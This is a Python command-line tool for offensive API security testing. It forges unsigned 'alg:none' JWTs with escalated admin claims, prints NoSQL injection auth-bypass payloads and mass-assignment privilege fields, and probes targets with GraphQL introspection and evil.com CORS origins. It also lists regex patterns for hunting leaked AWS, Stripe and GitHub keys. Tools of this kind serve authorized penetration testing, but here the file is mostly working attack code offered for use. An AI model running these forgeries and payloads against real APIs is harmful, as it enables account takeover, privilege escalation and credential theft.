#!/usr/bin/env python3
"""
api_helper.py — API Security Testing Helper

Usage:
    python3 api_helper.py jwt decode TOKEN
    python3 api_helper.py jwt alg-none TOKEN
    python3 api_helper.py graphql introspect https://target.com/graphql TOKEN
    python3 api_helper.py swagger-enum swagger.json
    python3 api_helper.py mass-assign /api/users/register
    python3 api_helper.py key-patterns
    python3 api_helper.py nosql-payloads
    python3 api_helper.py cors https://target.com/api/me TOKEN
"""
import sys, json, base64, urllib.request, urllib.parse

# ── JWT Helpers ──────────────────────────────────────────────────────────────

def b64pad(s):
    return s + "=" * (-len(s) % 4)

def jwt_decode(token):
    parts = token.split(".")
    if len(parts) != 3:
        print("[!] Not a valid JWT (expected 3 parts)"); return
    header = json.loads(base64.urlsafe_b64decode(b64pad(parts[0])))
    payload = json.loads(base64.urlsafe_b64decode(b64pad(parts[1])))
    print(f"\n[+] JWT Decoded\n")
    print(f"  Header : {json.dumps(header, indent=4)}")
    print(f"  Payload: {json.dumps(payload, indent=4)}")
    print(f"  Sig    : {parts[2][:20]}...\n")
    print("[*] Attack suggestions:")
    if header.get("alg", "").upper() in ("RS256", "RS384", "RS512"):
        print("  → Try RS256→HS256 key confusion (jwt_tool -X k)")
    if header.get("alg", "").upper().startswith("HS"):
        print("  → Brute force: hashcat -a 0 -m 16500 TOKEN rockyou.txt")
    print("  → Try alg:none (see: jwt_decode alg-none)")
    print("  → Modify payload claims (role, is_admin, user_id) and re-sign or strip sig")
    print()

def jwt_alg_none(token):
    parts = token.split(".")
    if len(parts) != 3:
        print("[!] Not a valid JWT"); return
    new_header = base64.urlsafe_b64encode(
        json.dumps({"alg": "none", "typ": "JWT"}).encode()
    ).rstrip(b"=").decode()
    payload_raw = base64.urlsafe_b64decode(b64pad(parts[1]))
    payload = json.loads(payload_raw)
    print(f"\n[+] Original payload: {json.dumps(payload)}")
    # Escalate common fields
    escalated = dict(payload)
    for field, val in [("role","admin"),("is_admin",True),("admin",True),("scope","admin")]:
        if field in escalated:
            escalated[field] = val
            print(f"  [!] Modified: {field} → {val}")
    new_payload = base64.urlsafe_b64encode(
        json.dumps(escalated).encode()
    ).rstrip(b"=").decode()
    forged = f"{new_header}.{new_payload}."
    print(f"\n[+] Forged alg:none token (no signature):\n  {forged}\n")

# ── GraphQL ──────────────────────────────────────────────────────────────────

INTROSPECT_QUERY = '{"query":"{ __schema { queryType { fields { name description } } mutationType { fields { name description } } types { name kind fields { name } } } }"}'

def graphql_introspect(url, token=None):
    print(f"\n[+] GraphQL Introspection: {url}\n")
    headers = {"Content-Type": "application/json"}
    if token:
        headers["Authorization"] = f"Bearer {token}"
    req = urllib.request.Request(url, INTROSPECT_QUERY.encode(), headers)
    try:
        with urllib.request.urlopen(req, timeout=10) as r:
            data = json.loads(r.read())
        schema = data.get("data", {}).get("__schema", {})
        qtypes = schema.get("queryType", {}).get("fields", [])
        mtypes = schema.get("mutationType", {}).get("fields", [])
        print("  Queries:")
        for f in qtypes:
            print(f"    {f['name']}: {f.get('description','')}")
        print("\n  Mutations:")
        for f in mtypes:
            print(f"    {f['name']}: {f.get('description','')}")
        print()
    except Exception as e:
        print(f"[!] Request failed: {e}")
        print("\n  Manual introspection query:\n")
        print(f"  curl -s -X POST {url} \\")
        print(f'       -H "Content-Type: application/json" \\')
        if token:
            print(f'       -H "Authorization: Bearer {token}" \\')
        print(f"       -d '{INTROSPECT_QUERY}' | python3 -m json.tool\n")

# ── Swagger/OpenAPI Enumeration ───────────────────────────────────────────────

def swagger_enum(spec_file):
    try:
        with open(spec_file) as f:
            spec = json.load(f)
    except Exception as e:
        print(f"[!] Could not load spec: {e}"); return
    print(f"\n[+] API Endpoints from {spec_file}\n")
    for path, methods in spec.get("paths", {}).items():
        for method, details in methods.items():
            if method in ("get","post","put","delete","patch","head","options"):
                summary = details.get("summary", details.get("operationId",""))
                auth = "AUTH" if details.get("security") else "NO-AUTH?"
                print(f"  [{method.upper():<7}] {path:<50} {auth:<10} {summary}")
    print()

# ── Mass Assignment Fields ────────────────────────────────────────────────────

MASS_ASSIGN_FIELDS = [
    "is_admin", "admin", "role", "roles", "user_role",
    "is_verified", "verified", "email_verified", "active",
    "balance", "credits", "account_balance", "points",
    "subscription", "plan", "tier", "account_type",
    "is_staff", "is_superuser", "bypass_payment",
    "internal", "trusted", "premium", "pro",
    "id", "user_id", "group_id",
]

def show_mass_assign(endpoint):
    print(f"\n[+] Mass Assignment test for: {endpoint}\n")
    body = {f: "<TEST-VALUE>" for f in MASS_ASSIGN_FIELDS}
    print(f"  Add these fields to any POST/PUT/PATCH request:\n")
    print(f"  {json.dumps(body, indent=4)}\n")
    print("  Replace <TEST-VALUE> with: true / 'admin' / 99999 / 1\n")

# ── API Key Patterns ──────────────────────────────────────────────────────────

KEY_PATTERNS = [
    ("AWS Access Key",     r"AKIA[0-9A-Z]{16}"),
    ("AWS Secret Key",     r"[0-9a-zA-Z/+]{40}"),
    ("Stripe Live",        r"sk_live_[0-9a-zA-Z]{24}"),
    ("Stripe Test",        r"sk_test_[0-9a-zA-Z]{24}"),
    ("GitHub Token",       r"ghp_[A-Za-z0-9]{36}"),
    ("GitHub OAuth",       r"gho_[A-Za-z0-9]{36}"),
    ("SendGrid",           r"SG\.[A-Za-z0-9_-]{22}\.[A-Za-z0-9_-]{43}"),
    ("Twilio",             r"SK[0-9a-f]{32}"),
    ("Slack Token",        r"xox[baprs]-[0-9]{12}-[0-9]{12}-[0-9a-zA-Z]{24}"),
    ("Google API Key",     r"AIza[0-9A-Za-z_-]{35}"),
    ("Firebase",           r"AAAA[A-Za-z0-9_-]{7}:[A-Za-z0-9_-]{140}"),
    ("Heroku API Key",     r"[0-9a-fA-F]{8}-[0-9a-fA-F]{4}-[0-9a-fA-F]{4}-[0-9a-fA-F]{4}-[0-9a-fA-F]{12}"),
    ("Generic Secret",     r"(secret|api_key|apikey|token|password)\s*[:=]\s*['\"][A-Za-z0-9]{16,}"),
]

def show_key_patterns():
    print("\n[+] API Key Regex Patterns (for grep/truffleHog)\n")
    for name, pattern in KEY_PATTERNS:
        print(f"  {name:<25} {pattern}")
    print("\n  Grep JS files:")
    for name, pattern in KEY_PATTERNS[:5]:
        print(f"  grep -rE '{pattern}' *.js")
    print("\n  TruffleHog:")
    print("  trufflehog --regex --entropy=True https://github.com/target/repo\n")

# ── NoSQL Injection ───────────────────────────────────────────────────────────

NOSQL_PAYLOADS = [
    ('Auth bypass (JSON)', '{"username": {"$gt": ""}, "password": {"$gt": ""}}'),
    ('Auth bypass regex',  '{"username": {"$regex": "admin.*"}, "password": {"$gt": ""}}'),
    ('Always true',        '{"$where": "1==1"}'),
    ('Extract field',      '{"username": {"$regex": "^a"}}'),
    ('Array injection',    'username[$gt]=&password[$gt]='),
    ('PHP array style',    'username[%24gt]=&password[%24gt]='),
]

def show_nosql():
    print("\n[+] NoSQL Injection Payloads\n")
    for name, payload in NOSQL_PAYLOADS:
        print(f"  [{name}]")
        print(f"    {payload}\n")

# ── CORS Test ────────────────────────────────────────────────────────────────

def cors_test(url, token=None):
    print(f"\n[+] CORS Test: {url}\n")
    headers_base = {}
    if token:
        headers_base["Authorization"] = f"Bearer {token}"
    test_origins = [
        "https://evil.com",
        "null",
        f"https://evil.{url.split('/')[2]}",
        f"https://{url.split('/')[2]}.evil.com",
    ]
    for origin in test_origins:
        headers = {**headers_base, "Origin": origin}
        req = urllib.request.Request(url, headers=headers)
        try:
            with urllib.request.urlopen(req, timeout=5) as r:
                acao = r.headers.get("Access-Control-Allow-Origin","(not set)")
                acac = r.headers.get("Access-Control-Allow-Credentials","(not set)")
                print(f"  Origin: {origin:<50}")
                print(f"    ACAO : {acao}")
                print(f"    ACAC : {acac}")
                if acao == origin and acac == "true":
                    print(f"    [!!!] VULNERABLE — reflects origin + allows credentials!")
                print()
        except Exception as e:
            print(f"  Origin: {origin} → error: {e}\n")

# ── Main ──────────────────────────────────────────────────────────────────────

def main():
    args = sys.argv[1:]
    if not args:
        print(__doc__); sys.exit(0)
    cmd = args[0]
    if cmd == "jwt":
        sub = args[1] if len(args) > 1 else ""
        token = args[2] if len(args) > 2 else ""
        if sub == "decode":
            jwt_decode(token)
        elif sub == "alg-none":
            jwt_alg_none(token)
        else:
            print("Usage: api_helper.py jwt [decode|alg-none] TOKEN")
    elif cmd == "graphql":
        sub = args[1] if len(args) > 1 else ""
        url = args[2] if len(args) > 2 else ""
        token = args[3] if len(args) > 3 else None
        if sub == "introspect":
            graphql_introspect(url, token)
        else:
            print("Usage: api_helper.py graphql introspect URL [TOKEN]")
    elif cmd == "swagger-enum":
        swagger_enum(args[1] if len(args) > 1 else "swagger.json")
    elif cmd == "mass-assign":
        show_mass_assign(args[1] if len(args) > 1 else "/api/endpoint")
    elif cmd == "key-patterns":
        show_key_patterns()
    elif cmd == "nosql-payloads":
        show_nosql()
    elif cmd == "cors":
        url = args[1] if len(args) > 1 else ""
        token = args[2] if len(args) > 2 else None
        cors_test(url, token)
    else:
        print(__doc__)

if __name__ == "__main__":
    main()
